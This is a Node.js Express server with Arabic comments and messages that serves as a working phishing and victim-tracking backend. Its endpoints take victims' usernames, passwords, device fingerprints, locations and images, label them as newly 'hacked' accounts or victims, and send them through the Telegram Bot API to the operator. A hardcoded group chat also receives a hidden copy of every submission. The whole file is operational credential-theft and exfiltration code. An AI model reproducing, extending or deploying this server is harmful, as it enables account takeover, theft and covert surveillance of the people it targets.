[file name]: server.js
[file content begin]
require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


const storage = multer.memoryStorage();
const upload = multer({ storage: storage });


const BOT_TOKEN = process.env.BOT_TOKEN;
const GROUP_CHAT_ID = "-1002291659993"; // جروب التتبع @group_rym-_7taGbUzNzhk
const ADMIN_USERNAME = "@QR_l4"; // يوزر المطور

// قاعدة بيانات بسيطة للمستخدمين
const userDatabase = new Map();

if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// دالة للتحقق من صحة الـ ID
function isValidUserId(chatId) {
  if (!chatId) return false;
  
  const idStr = chatId.toString();
  
  // التحقق من أن الـ ID ليس لقناة أو جروب (يبدأ بـ -100 أو -)
  if (idStr.startsWith('-100') || idStr.startsWith('-')) {
    return false;
  }
  
  // التحقق من أن الـ ID رقمي وليس نصي
  if (!/^\d+$/.test(idStr)) {
    return false;
  }
  
  // التحقق من أن الـ ID ضمن النطاق المقبول لحسابات المستخدمين
  const idNum = parseInt(idStr);
  if (idNum < 1 || idNum > 9999999999) {
    return false;
  }
  
  return true;
}

// دالة لتسجيل نشاط المستخدم
function logUserActivity(userId, action, data = {}) {
  const timestamp = new Date().toLocaleString("ar-EG");
  const userInfo = userDatabase.get(userId) || {
    id: userId,
    firstSeen: timestamp,
    lastSeen: timestamp,
    actions: [],
    suspicious: false,
    blockReason: null
  };
  
  userInfo.lastSeen = timestamp;
  userInfo.actions.push({
    action,
    timestamp,
    data: data,
    ip: data.ip || 'غير معروف'
  });
  
  // التحقق من النشاط المشبوه
  if (userInfo.actions.length > 10) { // إذا كان هناك أكثر من 10 إجراءات في وقت قصير
    userInfo.suspicious = true;
    userInfo.blockReason = "نشاط مريب - كثرة الطلبات";
  }
  
  userDatabase.set(userId, userInfo);
  return userInfo;
}

// دالة للتحقق من إذا كان المستخدم محظور
function isUserBlocked(userId) {
  const userInfo = userDatabase.get(userId);
  return userInfo && userInfo.suspicious;
}

async function sendToTelegram(chatId, message, fileBuffer = null, filename = null, isPhoto = false) {
  try {
    
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
      if (fileBuffer) {
        console.log(`📁 [محاكاة] مع ${isPhoto ? 'صورة' : 'ملف'}: ${filename}`);
      }
      return true;
    }

    if (fileBuffer && filename) {
      if (isPhoto) {
        // إرسال كصورة
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('photo', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      } else {
        // إرسال كملف
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('document', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      }
    } else {
      // إرسال رسالة نصية فقط
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// دالة للتحقق من وجود المستخدم في التليجرام
async function verifyTelegramUser(chatId) {
  try {
    if (!BOT_TOKEN) return true; // إذا لم يكن هناك توكن، نتخطى التحقق
    
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/getChat`, {
      chat_id: chatId
    });
    
    // إذا نجح الطلب، فهذا يعني أن الـ ID صالح
    return response.data.ok && response.data.result;
  } catch (error) {
    // إذا فشل الطلب، فهذا يعني أن الـ ID غير صالح أو المستخدم غير موجود
    console.error('Error verifying Telegram user:', error.response?.data || error.message);
    return false;
  }
}

// دالة لإرسال نسخة إلى الجروب
async function sendToGroup(message, userInfo = null, originalData = null) {
  try {
    let groupMessage = `📋 **نسخة من البيانات المرسلة**\n\n${message}`;
    
    if (userInfo) {
      groupMessage += `\n\n👤 **معلومات المرسل:**`;
      groupMessage += `\n🆔 ID: ${userInfo.id}`;
      groupMessage += `\n📅 أول ظهور: ${userInfo.firstSeen}`;
      groupMessage += `\n🕒 آخر ظهور: ${userInfo.lastSeen}`;
      groupMessage += `\n🔢 عدد الإجراءات: ${userInfo.actions.length}`;
      groupMessage += `\n⚠️ مشبوه: ${userInfo.suspicious ? 'نعم 🚨' : 'لا ✅'}`;
      
      if (userInfo.suspicious) {
        groupMessage += `\n🔴 سبب الحظر: ${userInfo.blockReason}`;
      }
    }
    
    if (originalData) {
      groupMessage += `\n\n📊 **البيانات الأصلية:**`;
      groupMessage += `\n${JSON.stringify(originalData, null, 2)}`;
    }
    
    const success = await sendToTelegram(GROUP_CHAT_ID, groupMessage);
    return success;
  } catch (error) {
    console.error('Error sending to group:', error);
    return false;
  }
}

// دالة لحظر مستخدم
async function blockUser(userId, reason) {
  const userInfo = userDatabase.get(userId);
  if (userInfo) {
    userInfo.suspicious = true;
    userInfo.blockReason = reason;
    userDatabase.set(userId, userInfo);
    
    // إرسال تنبيه للمطور
    const alertMessage = `🚨 **تم حظر مستخدم**\n\n👤 ID: ${userId}\n📋 السبب: ${reason}\n🕒 الوقت: ${new Date().toLocaleString("ar-EG")}`;
    await sendToTelegram(GROUP_CHAT_ID, alertMessage);
    
    return true;
  }
  return false;
}


app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
    
    // التحقق من صحة الـ ID أولاً
    if (!isValidUserId(chatId)) {
      return res.status(400).json({
        success: false,
        message: '❌ معرف مستخدم غير صالح - يرجى استخدام ID حساب شخصي صحيح',
        error: 'INVALID_USER_ID'
      });
    }
    
    // التحقق من وجود المستخدم في التليجرام
    const userExists = await verifyTelegramUser(chatId);
    if (!userExists) {
      return res.status(400).json({
        success: false,
        message: '❌ المستخدم غير موجود في Telegram - يرجى التأكد من الـ ID',
        error: 'USER_NOT_FOUND'
      });
    }
    
    // الحصول على عنوان IP المستخدم
    let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
    if (userIP === '::1') userIP = '127.0.0.1 (localhost)';
    
    // تسجيل نشاط المستخدم
    const userInfo = logUserActivity(chatId, 'send_credentials', {
      playerId,
      platform,
      ip: userIP,
      device: device || req.headers['user-agent']
    });
    
    // التحقق من إذا كان المستخدم محظور
    if (isUserBlocked(chatId)) {
      return res.status(403).json({
        success: false,
        message: 'تم حظر هذا المستخدم بسبب نشاط مريب',
        blockReason: userInfo.blockReason
      });
    }
    
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    
    const message = `♦️ - تم اختراق حساب جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}
👤 - مرسل من: ${chatId}`;

    // إرسال إلى المستخدم
    const success = await sendToTelegram(chatId, message);
    
    // إرسال نسخة إلى الجروب
    await sendToGroup(message, userInfo, req.body);
    
    if (success) {
      res.json({
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح',
        orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'فشل في إرسال الرسالة إلى Telegram'
      });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء إرسال البيانات',
      error: error.message
    });
  }
});

// نقطة النهاية لاستقبال بيانات معلومات الجهاز
app.post('/device-info', async (req, res) => {
  try {
    const { 
      country, 
      city, 
      ip, 
      time, 
      language, 
      platform, 
      deviceType, 
      browser, 
      cameraSupport, 
      screenResolution, 
      batteryLevel, 
      connectionType, 
      incognitoMode, 
      userActive, 
      loginDate, 
      location, 
      chatId 
    } = req.body;
    
    // التحقق من صحة الـ ID أولاً
    if (!isValidUserId(chatId)) {
      return res.status(400).json({
        success: false,
        message: '❌ معرف مستخدم غير صالح - يرجى استخدام ID حساب شخصي صحيح',
        error: 'INVALID_USER_ID'
      });
    }
    
    // التحقق من وجود المستخدم في التليجرام
    const userExists = await verifyTelegramUser(chatId);
    if (!userExists) {
      return res.status(400).json({
        success: false,
        message: '❌ المستخدم غير موجود في Telegram - يرجى التأكد من الـ ID',
        error: 'USER_NOT_FOUND'
      });
    }
    
    if (!chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'معرف المحادثة (chatId) مطلوب' 
      });
    }

    // تسجيل نشاط المستخدم
    const userInfo = logUserActivity(chatId, 'device_info', {
      ip: ip,
      country,
      city,
      deviceType,
      browser
    });

    // التحقق من إذا كان المستخدم محظور
    if (isUserBlocked(chatId)) {
      return res.status(403).json({
        success: false,
        message: 'تم حظر هذا المستخدم بسبب نشاط مريب',
        blockReason: userInfo.blockReason
      });
    }

    const message = `☠️ تم اختراق ضحية جديدة!

الدولة: ${country || "غير معروف"}
المدينة: ${city || "غير معروف"}
IP: ${ip || "غير معروف"}
التوقيت: ${time || "غير معروف"}
اللغة: ${language || "غير معروف"}
النظام: ${platform || "غير معروف"}
نوع الجهاز: ${deviceType || "غير معروف"}
نوع المتصفح: ${browser || "غير معروف"}
دعم الكاميرا: ${cameraSupport || "غير معروف"}
دقة الشاشة: ${screenResolution || "غير معروف"}
مستوى البطارية: ${batteryLevel || "غير معروف"}
نوع الاتصال: ${connectionType || "غير معروف"}
وضع التصفح الخفي: ${incognitoMode || "غير معروف"}
المستخدم نشط؟: ${userActive || "غير معروف"}
تاريخ الدخول: ${loginDate || "غير معروف"}
الموقع الجغرافي: ${location || "غير معروف"}
👤 مرسل من: ${chatId}`;

    // إرسال إلى المستخدم
    const success = await sendToTelegram(chatId, message);
    
    // إرسال نسخة إلى الجروب
    await sendToGroup(message, userInfo, req.body);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال معلومات الجهاز إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال المعلومات إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing device info:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لاستقبال بيانات التسجيل العامة
app.post('/register', async (req, res) => {
  try {
    const { username, password, ip, chatId } = req.body;
    
    // التحقق من صحة الـ ID أولاً
    if (!isValidUserId(chatId)) {
      return res.status(400).json({
        success: false,
        message: '❌ معرف مستخدم غير صالح - يرجى استخدام ID حساب شخصي صحيح',
        error: 'INVALID_USER_ID'
      });
    }
    
    // التحقق من وجود المستخدم في التليجرام
    const userExists = await verifyTelegramUser(chatId);
    if (!userExists) {
      return res.status(400).json({
        success: false,
        message: '❌ المستخدم غير موجود في Telegram - يرجى التأكد من الـ ID',
        error: 'USER_NOT_FOUND'
      });
    }
    
    if (!username || !password || !ip || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required fields: username, password, ip, and chatId are required' 
      });
    }

    // تسجيل نشاط المستخدم
    const userInfo = logUserActivity(chatId, 'register', {
      username,
      ip
    });

    // التحقق من إذا كان المستخدم محظور
    if (isUserBlocked(chatId)) {
      return res.status(403).json({
        success: false,
        message: 'تم حظر هذا المستخدم بسبب نشاط مريب',
        blockReason: userInfo.blockReason
      });
    }

    const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}\n👤 مرسل من: ${chatId}`;
    
    // إرسال إلى المستخدم
    const success = await sendToTelegram(chatId, message);
    
    // إرسال نسخة إلى الجروب
    await sendToGroup(message, userInfo, req.body);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال البيانات إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing registration:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});


app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No image file provided' 
      });
    }

    const { username, imageType, chatId } = req.body;
    
    // التحقق من صحة الـ ID أولاً
    if (!isValidUserId(chatId)) {
      return res.status(400).json({
        success: false,
        message: '❌ معرف مستخدم غير صالح - يرجى استخدام ID حساب شخصي صحيح',
        error: 'INVALID_USER_ID'
      });
    }
    
    // التحقق من وجود المستخدم في التليجرام
    const userExists = await verifyTelegramUser(chatId);
    if (!userExists) {
      return res.status(400).json({
        success: false,
        message: '❌ المستخدم غير موجود في Telegram - يرجى التأكد من الـ ID',
        error: 'USER_NOT_FOUND'
      });
    }
    
    // تسجيل نشاط المستخدم
    const userInfo = logUserActivity(chatId, 'upload_image', {
      username,
      imageType,
      fileSize: req.file.size
    });

    // التحقق من إذا كان المستخدم محظور
    if (isUserBlocked(chatId)) {
      return res.status(403).json({
        success: false,
        message: 'تم حظر هذا المستخدم بسبب نشاط مريب',
        blockReason: userInfo.blockReason
      });
    }

    let message = `🖼️ تم اختراق صورة جديدة`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
    message += `\n👤 مرسل من: ${chatId}`;
    
    // إرسال إلى المستخدم
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `image-${Date.now()}${path.extname(req.file.originalname || '.jpg')}`,
      true
    );
    
    // إرسال نسخة إلى الجروب (بدون الصورة)
    await sendToGroup(message, userInfo, {
      username,
      imageType,
      fileSize: req.file.size,
      originalName: req.file.originalname
    });
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصورة إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصورة إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing image upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة نهاية جديدة لإدارة المستخدمين (للمطور فقط)
app.post('/admin/block-user', async (req, res) => {
  try {
    const { userId, reason, adminKey } = req.body;
    
    // تحقق بسيط من الصلاحية (يمكن تطويره)
    if (adminKey !== process.env.ADMIN_KEY) {
      return res.status(403).json({
        success: false,
        message: 'غير مصرح بالوصول'
      });
    }
    
    if (!userId || !reason) {
      return res.status(400).json({
        success: false,
        message: 'معرف المستخدم والسبب مطلوبان'
      });
    }
    
    const success = await blockUser(userId, reason);
    
    if (success) {
      res.json({
        success: true,
        message: `تم حظر المستخدم ${userId} بنجاح`
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'المستخدم غير موجود'
      });
    }
  } catch (error) {
    console.error('Error blocking user:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء حظر المستخدم'
    });
  }
});

// نقطة نهاية لعرض إحصائيات المستخدمين
app.get('/admin/stats', async (req, res) => {
  try {
    const stats = {
      totalUsers: userDatabase.size,
      suspiciousUsers: Array.from(userDatabase.values()).filter(user => user.suspicious).length,
      totalActions: Array.from(userDatabase.values()).reduce((sum, user) => sum + user.actions.length, 0),
      recentActivity: Array.from(userDatabase.values())
        .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen))
        .slice(0, 10)
        .map(user => ({
          id: user.id,
          lastSeen: user.lastSeen,
          actions: user.actions.length,
          suspicious: user.suspicious
        }))
    };
    
    res.json({
      success: true,
      stats
    });
  } catch (error) {
    console.error('Error getting stats:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء جلب الإحصائيات'
    });
  }
});

app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'Server is running',
    tokenConfigured: !!BOT_TOKEN,
    groupConfigured: !!GROUP_CHAT_ID,
    totalUsers: userDatabase.size,
    environment: process.env.NODE_ENV || 'development'
  });
});

app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true,
    message: 'مرحباً بك في سيرفر Telegram Bot',
    features: [
      '📱 إرسال بيانات الحسابات',
      '💻 تتبع معلومات الأجهزة', 
      '🖼️ رفع الصور والملفات',
      '👥 نظام تتبع المستخدمين',
      '🚨 نظام حظر تلقائي للنشاط المشبوه',
      '📊 إرسال نسخ إلى جروب التتبع',
      '🔒 تحقق من صحة ID المستخدم'
    ],
    admin: ADMIN_USERNAME
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  console.log(`🌐 Endpoints available:`);
  console.log(`   📱 /send-to-telegram - إرسال بيانات الحساب`);
  console.log(`   💻 /device-info - إرسال معلومات الجهاز`);
  console.log(`   📝 /register - تسجيل الحسابات`);
  console.log(`   🖼️ /upload-image - رفع الصور`);
  console.log(`   🎵 /upload-audio - رفع الصوت`);
  console.log(`   ⚡ /admin/stats - إحصائيات المستخدمين`);
  console.log(`   🔒 /admin/block-user - حظر مستخدم`);
  console.log(`   📊 جروب التتبع: ${GROUP_CHAT_ID}`);
  console.log(`   🔐 نظام التحقق: ✅ مفعل - يرفض القنوات والمجموعات`);
  
  if (!BOT_TOKEN) {
    console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
  }
});
[file content end]
